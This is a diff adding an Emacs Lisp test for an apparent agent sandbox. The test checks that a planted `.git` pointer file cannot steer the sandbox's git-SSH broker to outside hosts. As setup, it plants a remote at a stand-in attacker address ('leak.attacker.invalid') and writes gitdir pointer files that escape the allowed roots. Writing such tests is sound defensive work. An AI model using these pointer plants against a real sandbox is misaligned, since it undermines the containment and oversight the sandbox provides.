@@ -262,7 +262,64 @@ cannot choose the destinations a later command's broker allows"
                     result (test-mevedel-sandbox-git-ssh--run prepared))
               (should (plist-get prepared :git-ssh))
               (ert-info ((cdr result)) (should (eql 0 (car result)))))
-          (mevedel-sandbox-cleanup prepared))))))
+          (mevedel-sandbox-cleanup prepared)))))
+  :doc "real Bubblewrap pointer plant: a `.git' file aimed at a repository outside
+the roots cannot choose the broker's destinations, with or without an earlier grant"
+  (let ((mevedel-sandbox-mode 'required)
+        (mevedel-sandbox--probe-cache nil))
+    (skip-unless (and (eq system-type 'gnu/linux)
+                      (executable-find "git") (executable-find "python3")
+                      (plist-get (mevedel-sandbox-probe) :available)))
+    (test-mevedel-sandbox-git-ssh--with-repositories
+      (let ((sub (file-name-concat work "sub"))
+            (other (file-name-concat root "other"))
+            (existing (file-name-concat root "existing"))
+            prepared result)
+        (make-directory sub)
+        (make-directory other)
+        (test-mevedel-sandbox-git-ssh--git root "init" "-q" "existing")
+        (test-mevedel-sandbox-git-ssh--git existing "remote" "add" "z"
+                                           "git@existing-on-disk.example:r")
+        (cl-flet ((step (command workdir roots &optional grant)
+                    (setq prepared (mevedel-sandbox-prepare command workdir roots grant)
+                          result (test-mevedel-sandbox-git-ssh--run prepared))
+                    (prog1 prepared (mevedel-sandbox-cleanup prepared))))
+          (unwind-protect
+              (progn
+                ;; D: an ordinary grant outside the workspace plants a repository.
+                (step (list "sh" "-c"
+                            (concat "cd ../other && git init -q && git remote add y "
+                                    "ssh://git@leak.attacker.invalid:4444/x"))
+                      work (list work)
+                      `(:file-system ((:path ,(file-name-as-directory other)
+                                       :access write :recursive t))))
+                (ert-info ((cdr result)) (should (eql 0 (car result))))
+                (dolist (target (list (file-name-concat other ".git")      ; D
+                                      (file-name-concat existing ".git")   ; E1
+                                      "../../existing/.git"))              ; E3
+                  (ert-info ((format "pointer: %s" target))
+                    (when (file-exists-p (file-name-concat sub ".git"))
+                      (delete-file (file-name-concat sub ".git")))
+                    ;; A grantless command writes the pointer file.
+                    (step (list "sh" "-c" (format "printf 'gitdir: %%s\\n' %s > sub/.git"
+                                                  (shell-quote-argument target)))
+                          work (list work))
+                    (ert-info ((cdr result)) (should (eql 0 (car result))))
+                    ;; Workdir sub as its own root, and under the workspace root
+                    ;; (the child-agent working_directory case, E5).
+                    (dolist (roots (list (list sub) (list work)))
+                      (ert-info ((format "roots: %S" roots))
+                        (should-not (plist-get (step '("git" "ls-remote" "y" "z") sub roots)
+                                               :git-ssh))
+                        (should-not (mevedel-sandbox--git-ssh-git-dir
+                                     "git" sub (mapcar #'file-name-as-directory roots)))))))
+                (should-not (and (file-exists-p log)
+                                 (with-temp-buffer
+                                   (insert-file-contents log)
+                                   (string-match-p "attacker\\|existing-on-disk"
+                                                   (buffer-string))))))
+            (when (and prepared (plist-get prepared :git-ssh))
+              (mevedel-sandbox-cleanup prepared))))))))
 
 (mevedel-deftest mevedel-sandbox--git-ssh-arguments ()
   ,test
